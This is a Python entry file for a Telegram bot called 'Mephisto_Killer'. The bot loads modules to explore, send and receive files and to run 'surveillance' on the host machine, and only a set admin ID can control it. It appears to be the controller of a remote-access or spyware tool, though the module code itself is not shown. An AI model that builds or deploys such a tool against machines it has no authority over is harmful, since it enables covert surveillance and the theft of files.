# main.py

import telebot
from bot_core.config import BOT_ADMIN_ID, MACHINE_NAME
from bot_core.modules.file_sender import attach_file_sender_handlers
from bot_core.modules.explorer import attach_explorer_handlers
from bot_core.modules.file_receive import attach_file_receive_handlers
from bot_core.modules.surveillance import attach_surveillance_handlers
# from bot_core.modules.folder_watch import start_folder_watch
from bot_core.utils.escape import escape_markdown

def get_token():
    with open("token.txt", "r") as f:
        return f.read().strip()

# Init bot
bot = telebot.TeleBot(get_token())

# Attach modules
attach_file_sender_handlers(bot)
attach_explorer_handlers(bot)
# receive file
attach_file_receive_handlers(bot)
# suveillance
attach_surveillance_handlers(bot)
#watch folder

# start_folder_watch()

# Start handler
@bot.message_handler(commands=['start'])
def start_handler(message):
    print("bot is started....")
    if message.from_user.id != BOT_ADMIN_ID:
        bot.reply_to(message, "❌ Unauthorized user.")
        return
    bot.reply_to(
        message,
        escape_markdown(f"🤖 Mephisto_Killer active on `{MACHINE_NAME}`.\nAwaiting your command..."),
        parse_mode='Markdown'
    )


# Start polling
bot.infinity_polling()
